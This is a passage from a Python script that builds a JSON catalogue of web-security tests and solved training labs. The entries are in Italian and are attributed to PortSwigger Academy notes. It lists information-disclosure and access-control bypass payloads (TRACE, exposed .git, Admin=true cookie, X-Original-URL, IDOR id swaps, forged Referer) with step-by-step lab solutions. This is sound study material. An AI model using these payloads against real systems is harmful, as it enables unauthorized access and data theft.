                process="Lab risolto cambiando GET /product?productId=1 in productId=a: l'errore rivela che gira Apache Struts 2 2.3.31."),
            test("Dati di debug",
                 goal="Leggere variabili, credenziali, chiavi da log/diagnostica.",
                 process="Cerca pagine o file di debug (es. phpinfo) che espongono variabili di sessione, host/credenziali di back-end, chiavi."),
            lab("Lab: secret key in phpinfo",
                process="Lab risolto con fuzzing sull'URL: scopro /cgi-bin con phpinfo, dove trovo la secret key."),
            test("File di backup del codice",
                 goal="Leggere il sorgente (e i segreti) da backup temporanei.",
                 payload="file.php~\nfile.php.bak",
                 process="Editor e tool creano backup (tilde ~ o estensione diversa): richiedere il file col suffisso di backup puo' restituire il sorgente, a volte con chiavi/credenziali."),
            lab("Lab: directory /backup",
                process="Lab risolto trovando la directory /backup dove sono scritte le password."),
            test("Configurazioni insicure (metodo TRACE)",
                 goal="Sfruttare opzioni di debug lasciate attive.",
                 payload="TRACE / HTTP/1.1",
                 process="Il metodo TRACE rimanda la richiesta ricevuta: puo' rivelare header di autenticazione interni aggiunti dai reverse proxy."),
            lab("Lab: header custom via TRACE",
                process="Lab risolto: trovo /admin; con TRACE scopro un header custom che permette il login; lo uso sulle GET per /admin e per la delete."),
            test("Cronologia del controllo di versione (.git)",
                 goal="Recuperare sorgente e segreti dalla cartella .git esposta.",
                 payload="/.git/",
                 process="Se /.git e' esposta, scaricala tutta e aprila con Git: nei diff dei commit puoi trovare codice e segreti."),
            lab("Lab: .git esposta",
                process="Lab risolto visitando /.git, scaricando tutto (wget -r .../.git/) e leggendo nel diff del commit 'Remove admin password from config' la password in chiaro in admin.conf."),
        ]),
    ],
)


# ===========================================================================
#  7. ACCESS CONTROL
# ===========================================================================
ACCESS_CONTROL = macro(
    "Access Control",
    "Aggirare le restrizioni su chi puo' fare cosa o accedere a quali risorse.",
    (
        "Il controllo degli accessi decide se un utente e' autorizzato a compiere un'azione; "
        "si appoggia ad autenticazione (chi sei) e gestione della sessione (stesse richieste, "
        "stesso utente). Tipi: verticale (funzioni per ruoli diversi), orizzontale (risorse di "
        "utenti diversi), dipendente dal contesto (ordine dei passaggi).\n\n"
        "Prevenzione: mai affidarsi all'offuscamento; negare per default; un meccanismo "
        "centralizzato; dichiarare esplicitamente gli accessi consentiti; testare a fondo."
    ),
    references=PS + "/access-control",
    children=[
        micro("Tipi di controllo degli accessi", "Le tre categorie da tenere a mente.", [
            test("Verticale, orizzontale, contesto",
                 goal="Classificare il controllo per orientare i test.",
                 process="Verticale: funzioni riservate a ruoli (admin vs utente). Orizzontale: risorse del singolo utente (i miei conti, non quelli altrui). Contesto: azioni nell'ordine giusto (non modificare il carrello dopo il pagamento)."),
        ]),
        micro("Escalation verticale dei privilegi",
              "Accedere a funzioni per cui non si hanno i permessi.", [
            test("Funzionalita' admin non protetta",
                 goal="Raggiungere pagine amministrative da utente normale.",
                 payload="/admin\n/administrator-panel",
                 process="Cerca i pannelli admin con fuzzing o robots.txt e prova ad accedervi direttamente."),
            lab("Lab: pannello admin trovato",
                process="Lab risolto trovando il percorso /administrator-panel con fuzzing o robots.txt."),
            test("URL 'nascosto' divulgato nel client",
                 goal="Trovare URL admin poco prevedibili ma esposti.",
                 process="Un URL come /administrator-panel-yb556 puo' essere nel JavaScript che costruisce la UI in base al ruolo: visibile a tutti nel sorgente."),
            lab("Lab: URL admin nel sorgente",
                process="Lab risolto facendo 'ispeziona sorgente' e trovando il percorso /admin-<codice>."),
            test("Controllo basato su parametri",
                 goal="Sfruttare ruolo/diritti memorizzati in un valore controllabile.",
                 payload="/home.jsp?admin=true\n/home.jsp?role=1\nCookie: Admin=true\n{\"email\":\"...\",\"roleid\":2}",
                 process="Se il ruolo e' in un campo nascosto, in un cookie o nella query string, modificalo."),
            lab("Lab: cookie Admin=true",
                process="Lab risolto modificando il cookie da Admin=false a Admin=true nella GET su /admin."),
            lab("Lab: roleid nella richiesta",
                process="Lab risolto aggiungendo alla richiesta di cambio password, oltre all'email, anche il ruolo: {\"email\":\"ciao2@prova.com\",\"roleid\":2}."),
            test("Misconfig di piattaforma (override dell'URL)",
                 goal="Aggirare controlli front-end legati a URL/metodo.",
                 payload="POST / HTTP/1.1\nX-Original-URL: /admin/deleteUser",
                 process="Header come X-Original-URL / X-Rewrite-URL sovrascrivono il path: se il front-end filtra per URL ma il back-end onora l'header, bypassi il controllo (i parametri restano nella query string reale)."),
            lab("Lab: X-Original-URL",
                process="Lab risolto: GET / con X-Original-URL: /invalid da' 404 (il back-end usa l'header); cambio in /admin per entrare, e per eliminare carlos uso GET /?username=carlos con X-Original-URL: /admin/delete."),
            test("Override del metodo HTTP",
                 goal="Eseguire un'azione protetta con un metodo diverso.",
                 process="Se il controllo limita URL+metodo ma l'app accetta altri metodi (es. GET al posto di POST), usa il metodo non filtrato."),
            lab("Lab: POST -> GET",
                process="Lab risolto: la promozione di carlos col cookie dell'utente normale da' 'Unauthorized'; cambiando metodo (POSTX -> 'missing parameter', quindi Change request method a GET) e mettendo il proprio username la richiesta passa."),
            test("Discrepanze nel matching degli URL",
                 goal="Sfruttare differenze di normalizzazione dei percorsi.",
                 payload="/ADMIN/DELETEUSER\n/admin/deleteUser.anything   (Spring useSuffixPatternMatch)\n/admin/deleteUser/   (slash finale)",
                 process="Se il controllo accessi e' meno tollerante del routing (maiuscole, estensioni, slash finale), raggiungi l'endpoint aggirando la restrizione."),
        ]),
        micro("Escalation orizzontale e IDOR",
              "Accedere alle risorse di un altro utente.", [
            test("Cambiare l'identificatore (IDOR)",
                 goal="Vedere/gestire risorse di un altro utente cambiando un id.",
                 payload="/my-account?id=wiener  ->  /my-account?id=carlos",
                 process="Modifica il parametro che identifica la risorsa (id, user...). Gli Insecure Direct Object References sono una sottocategoria del controllo accessi."),
            lab("Lab: id orizzontale",
                process="Lab risolto cambiando nell'URL /my-account?id=wiener in ...?id=carlos."),
            test("Identificatori non prevedibili (GUID)",
                 goal="Recuperare un GUID altrui divulgato altrove.",
                 process="Se l'id e' un GUID, cercalo dove l'app fa riferimento all'utente: post, commenti, recensioni."),
            lab("Lab: GUID da un post",
                process="Lab risolto: trovo un post di carlos, dal link ricavo il suo user id, lo metto nel parametro id della mia pagina account e recupero la sua API key."),
            test("Redirect che perde comunque i dati",
                 goal="Sfruttare risposte che reindirizzano ma includono dati sensibili.",
                 process="Anche se l'app reindirizza al login per accesso non autorizzato, la risposta del redirect puo' contenere ancora i dati della vittima."),
            lab("Lab: dati nella response del redirect",
                process="Lab risolto cambiando id da wiener a carlos: vengo reindirizzato al login ma nella response compare comunque la API key di carlos."),
            test("Da orizzontale a verticale",
                 goal="Compromettere un utente piu' privilegiato.",
                 process="Un'escalation orizzontale verso un admin (es. leggerne/cambiarne la password) diventa verticale."),
            lab("Lab: password admin in chiaro nella response",
                process="Lab risolto cambiando id da wiener a administrator: la password in pagina e' mascherata con ****, ma nella response di Burp si legge in chiaro."),
            lab("Lab: IDOR su file statico",
                process="Lab risolto: nella trascrizione della chat la richiesta porta a /download/txt2; cambiando in /txt1 scarico la chat di carlos con la password."),
        ]),
        micro("Altri bypass del controllo accessi",
              "Processi multi-step, header Referer, geolocalizzazione.", [
            test("Processi multi-step protetti male",
                 goal="Saltare i passaggi protetti e inviare solo l'ultimo.",
                 process="Se solo alcuni passaggi sono protetti, invia direttamente la richiesta del passaggio finale con i parametri necessari."),
            lab("Lab: solo l'ultimo step",
                process="Lab risolto prendendo l'ultimo step della conferma del passaggio ad admin e rifacendolo con il cookie di wiener."),
            test("Controllo basato sull'header Referer",
                 goal="Falsificare il Referer per accedere a sottopagine.",
                 payload="Referer: https://sito/admin",
                 process="Se le sottopagine (es. /admin/deleteUser) controllano solo il Referer, falsificalo con l'URL /admin."),
            lab("Lab: Referer forgiato",
                process="Lab risolto rimandando la richiesta di upgrade con header Referer .../admin: nonostante il cookie di sessione sia di wiener, funziona."),
            test("Controllo basato sulla geolocalizzazione",
                 goal="Aggirare restrizioni geografiche.",
                 process="Usa proxy/VPN o manipola i meccanismi di geolocalizzazione lato client."),
        ]),
    ],
)


# Tutte le macrocategorie, nell'ordine degli appunti.
MACROS = [
    SQL_INJECTION,
    AUTHENTICATION,
    PATH_TRAVERSAL,
    OS_COMMAND_INJECTION,
    BUSINESS_LOGIC,
    INFORMATION_DISCLOSURE,
    ACCESS_CONTROL,
]


def main():
    out = Path(__file__).resolve().parent.parent / "data" / "web_seed.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(
        json.dumps({"source": "appunti PortSwigger Academy", "topics": MACROS},
                   ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    nmicro = sum(len(m["children"]) for m in MACROS)
    ntest = sum(len(mi["checks"]) for m in MACROS for mi in m["children"]) \
        + sum(len(m["checks"]) for m in MACROS)
    print(f"Scritte {len(MACROS)} macrocategorie, {nmicro} microcategorie, {ntest} test/lab in {out}")


if __name__ == "__main__":
    main()
